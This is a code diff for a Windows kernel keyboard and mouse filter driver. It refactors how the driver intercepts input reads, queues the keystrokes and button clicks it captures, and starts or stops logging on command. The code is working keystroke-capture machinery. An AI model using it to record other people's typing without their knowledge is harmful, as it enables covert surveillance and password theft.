@@ -49,6 +49,7 @@ NTSTATUS LmbPassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 BOOLEAN isLogging;
 
 static NTSTATUS dispatchDevCtlLogStart(PDEVICE_OBJECT pDeviceObject);
+static NTSTATUS dispatchDevCtlLogStop();
 
 NTSTATUS LmbDispatchDeviceControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 	const PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);
@@ -83,9 +84,13 @@ NTSTATUS LmbDispatchDeviceControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 		pIrp->IoStatus.Information = 0;
 		break;
 	case IOCTL_LOG_STOP:
-		isLogging = FALSE;
+		ntStatus = dispatchDevCtlLogStop();
+
+		if (!NT_SUCCESS(ntStatus)) {
+			DBG_PRINTF("LmbDispatchDeviceControl: dispatchDevCtlLogStop failed: 0x%lx\n", ntStatus);
+		}
+
 		pIrp->IoStatus.Information = 0;
-		DBG_PRINT("LmbDispatchDeviceControl: Stopped logging\n");
 		break;
 	default:
 		ntStatus = STATUS_INVALID_PARAMETER;
@@ -98,36 +103,65 @@ NTSTATUS LmbDispatchDeviceControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 }
 
 
-static NTSTATUS dispatchKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
-static NTSTATUS dispatchMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
+KSEMAPHORE readSemaphores[LOG_MAX];
+
+static NTSTATUS completeKbdRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
+static NTSTATUS completeMouRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
 
 NTSTATUS LmbDispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
-	NTSTATUS ntStatus = STATUS_SUCCESS;
+	
+	if (!pDeviceObject->DeviceExtension) {
+		DBG_PRINT("LmbDispatchRead: No device extension\n");
+
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;
+
+	if (!pTargetDevice) {
+		DBG_PRINT("LmbDispatchRead: No target device\n");
+
+		return STATUS_INVALID_PARAMETER;
+	}
 
 	CSHORT devType = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->Type;
+	PIO_COMPLETION_ROUTINE pIoCompletionRoutine = NULL;
+	LogType logType = LOG_KBD;
 
-	if (devType == FILE_DEVICE_KEYBOARD) {
-		ntStatus = dispatchKbdRead(pDeviceObject, pIrp);
-
-		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("LmbDispatchRead: dispatchKbdRead failed: 0x%lx\n", ntStatus);
-		}
-
-	}
-	else if (devType == FILE_DEVICE_MOUSE) {
-		ntStatus = dispatchMouRead(pDeviceObject, pIrp);
-
-		if (!NT_SUCCESS(ntStatus)) {
-			DBG_PRINTF("LmbDispatchRead: dispatchKbdRead failed: 0x%lx\n", ntStatus);
-		}
-
-	}
-	else {
+	switch (devType) {
+	case FILE_DEVICE_KEYBOARD:
+		pIoCompletionRoutine = completeKbdRead;
+		logType = LOG_KBD;
+		break;
+	case FILE_DEVICE_MOUSE:
+		pIoCompletionRoutine = completeMouRead;
+		logType = LOG_MOU;
+		break;
+	default:
 		DBG_PRINT("LmbDispatchRead: Unknown device type\n");
-		ntStatus = STATUS_DEVICE_DATA_ERROR;
+		return STATUS_DEVICE_DATA_ERROR;
 	}
 
-	return ntStatus;
+	// timeout needs to be zero at IRQL >= DISPATCH_LEVEL
+	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
+	const NTSTATUS ntStatus = KeWaitForSingleObject(&readSemaphores[logType], Executive, KernelMode, FALSE, &zeroTimeout);
+
+	if (!NT_SUCCESS(ntStatus)) {
+		DBG_PRINTF("dispatchKbdRead: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);
+
+		return ntStatus;
+	}
+	else if (ntStatus == STATUS_TIMEOUT) {
+		DBG_PRINT("dispatchKbdRead: KeWaitForSingleObject timeout\n");
+		IoSkipCurrentIrpStackLocation(pIrp);
+
+		return IoCallDriver(pTargetDevice, pIrp);
+	}
+
+	IoCopyCurrentIrpStackLocationToNext(pIrp);
+	IoSetCompletionRoutine(pIrp, pIoCompletionRoutine, NULL, TRUE, TRUE, TRUE);
+
+	return IoCallDriver(pTargetDevice, pIrp);
 }
 
 
@@ -159,7 +193,6 @@ static NTSTATUS dispatchDevCtlLogStart(PDEVICE_OBJECT pDeviceObject) {
 	isLogging = TRUE;
 
 	for (int i = 0; i < LOG_MAX; i++) {
-		initBlockingQueue(&inputQueues[i], 0x10);
 		ntStatus = startLogThread(pDeviceObject->DriverObject, i);
 
 		if (NT_SUCCESS(ntStatus)) {
@@ -177,47 +210,23 @@ static NTSTATUS dispatchDevCtlLogStart(PDEVICE_OBJECT pDeviceObject) {
 }
 
 
-KSEMAPHORE readSemaphores[LOG_MAX];
+static NTSTATUS dispatchDevCtlLogStop() {
+	isLogging = FALSE;
+	NTSTATUS ntStatus = STATUS_SUCCESS;
 
-static NTSTATUS completeKbdRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
+	for (int i = 0; i < LOG_MAX; i++) {
+		ntStatus = stopLogThread(i);
 
-static NTSTATUS dispatchKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
-	// start read operation
-	// timeout needs to be zero at IRQL >= DISPATCH_LEVEL
-	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
-	const NTSTATUS ntStatus = KeWaitForSingleObject(&readSemaphores[LOG_KBD], Executive, KernelMode, FALSE, &zeroTimeout);
+		if (NT_SUCCESS(ntStatus)) {
+			DBG_PRINTF("dispatchDevCtlLogStop: Stopped log thread %d\n", i);
+		}
+		else {
+			DBG_PRINTF2("dispatchDevCtlLogStop: stopLogThread failed for type %d: 0x%lx\n", i, ntStatus);
+		}
 
-	if (!NT_SUCCESS(ntStatus)) {
-		DBG_PRINTF("dispatchKbdRead: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);
-
-		return ntStatus;
-	}
-	// completeRead has not finished yet
-	else if (ntStatus == STATUS_TIMEOUT) {
-		DBG_PRINT("dispatchKbdRead: KeWaitForSingleObject timeout\n");
-		IoSkipCurrentIrpStackLocation(pIrp);
-	}
-	else {
-		IoCopyCurrentIrpStackLocationToNext(pIrp);
-		IoSetCompletionRoutine(pIrp, completeKbdRead, NULL, TRUE, TRUE, TRUE);
 	}
 
-	if (!pDeviceObject->DeviceExtension) {
-		DBG_PRINT("dispatchKbdRead: No device extension\n");
-
-		return STATUS_INVALID_PARAMETER;
-	}
-
-	const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;
-
-	if (!pTargetDevice) {
-		DBG_PRINT("dispatchKbdRead: No target device\n");
-
-		return STATUS_INVALID_PARAMETER;
-	}
-
-	// call lower level driver
-	return IoCallDriver(pTargetDevice, pIrp);
+	return ntStatus;
 }
 
 
@@ -229,6 +238,8 @@ static NTSTATUS completeKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID p
 
 	for (size_t i = 0; i < countData; i++) {
 
+		if (!isLogging) break;
+
 		const PKEYBOARD_INPUT_DATA pKbdInputData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
 
 		if (!pKbdInputData) {
@@ -237,35 +248,23 @@ static NTSTATUS completeKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID p
 			continue;
 		}
 
-		if (isLogging) {
-			logKbdToDbg(pKbdInputData);
+		logKbdToDbg(pKbdInputData);
+
+		KbdDataEntry* const pKbdDataEntry = (KbdDataEntry*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KbdDataEntry), KBD_LIST_DATA_TAG);
+
+		if (!pKbdDataEntry) {
+			DBG_PRINT("completeKbdRead: ExAllocatePool2 failed\n");
+
+			continue;
 		}
 
-		// if blocking queue is waiting, it needs at least one more item
-		if (inputQueues[LOG_KBD].isWaiting) {
+		pKbdDataEntry->data = *pKbdInputData;
+		const NTSTATUS ntStatus = addToBlockigQueue(&inputQueues[LOG_KBD], &pKbdDataEntry->list);
 
-			// if logging is switched off, the blocking queue does not need to wait anymore
-			if (!isLogging) {
-				inputQueues[LOG_KBD].isWaiting = FALSE;
-			}
+		if (ntStatus != STATUS_SUCCESS) {
+			DBG_PRINTF("completeKbdRead: addBlockigQueue failed: 0x%lx\n", ntStatus);
 
-			KbdDataEntry* const pKbdDataEntry = (KbdDataEntry*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KbdDataEntry), KBD_LIST_DATA_TAG);
-
-			if (!pKbdDataEntry) {
-				DBG_PRINT("completeKbdRead: ExAllocatePool2 failed\n");
-
-				continue;
-			}
-
-			pKbdDataEntry->data = *pKbdInputData;
-			const NTSTATUS ntStatus = addToBlockigQueue(&inputQueues[LOG_KBD], &pKbdDataEntry->list);
-
-			if (ntStatus != STATUS_SUCCESS) {
-				DBG_PRINTF("completeKbdRead: addBlockigQueue failed: 0x%lx\n", ntStatus);
-
-				ExFreePoolWithTag(pKbdDataEntry, KBD_LIST_DATA_TAG);
-			}
-
+			ExFreePoolWithTag(pKbdDataEntry, KBD_LIST_DATA_TAG);
 		}
 
 	}
@@ -284,48 +283,6 @@ static NTSTATUS completeKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID p
 }
 
 
-static NTSTATUS completeMouRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
-
-static NTSTATUS dispatchMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
-	// start read operation
-	// timeout needs to be zero at IRQL >= DISPATCH_LEVEL
-	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
-	const NTSTATUS ntStatus = KeWaitForSingleObject(&readSemaphores[LOG_MOU], Executive, KernelMode, FALSE, &zeroTimeout);
-
-	if (!NT_SUCCESS(ntStatus)) {
-		DBG_PRINTF("dispatchMouRead: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);
-
-		return ntStatus;
-	}
-	// completeRead has not finished yet
-	else if (ntStatus == STATUS_TIMEOUT) {
-		DBG_PRINT("dispatchMouRead: KeWaitForSingleObject timeout\n");
-		IoSkipCurrentIrpStackLocation(pIrp);
-	}
-	else {
-		IoCopyCurrentIrpStackLocationToNext(pIrp);
-		IoSetCompletionRoutine(pIrp, completeMouRead, NULL, TRUE, TRUE, TRUE);
-	}
-
-	if (!pDeviceObject->DeviceExtension) {
-		DBG_PRINT("dispatchMouRead: No device extension\n");
-
-		return STATUS_INVALID_PARAMETER;
-	}
-
-	const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;
-
-	if (!pTargetDevice) {
-		DBG_PRINT("dispatchMouRead: No target device\n");
-
-		return STATUS_INVALID_PARAMETER;
-	}
-
-	// call lower level driver
-	return IoCallDriver(pTargetDevice, pIrp);
-}
-
-
 static NTSTATUS completeMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext) {
 	UNREFERENCED_PARAMETER(pDeviceObject);
 	UNREFERENCED_PARAMETER(pContext);
@@ -333,6 +290,9 @@ static NTSTATUS completeMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID p
 	const size_t countData = pIrp->IoStatus.Information / sizeof(MOUSE_INPUT_DATA);
 
 	for (size_t i = 0; i < countData; i++) {
+
+		if (!isLogging) break;
+
 		const PMOUSE_INPUT_DATA pMouInputData = (PMOUSE_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer + i;
 
 		if (!pMouInputData) {
@@ -341,19 +301,9 @@ static NTSTATUS completeMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID p
 			continue;
 		}
 
-		// log just button strokes, no movement
-		if (isLogging && pMouInputData->ButtonFlags) {
+		// just log button clicks, no cursor movements
+		if (pMouInputData->ButtonFlags) {
 			logMouToDbg(pMouInputData);
-		}
-
-		// if blocking queue is waiting, it needs at least one more item
-		// log just button strokes, no movement
-		if (inputQueues[LOG_MOU].isWaiting && pMouInputData->ButtonFlags) {
-
-			// if logging is switched off, the blocking queue does not need to wait anymore
-			if (!isLogging) {
-				inputQueues[LOG_MOU].isWaiting = FALSE;
-			}
 
 			MouDataEntry* const pMouDataEntry = (MouDataEntry*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MouDataEntry), MOU_LIST_DATA_TAG);
 
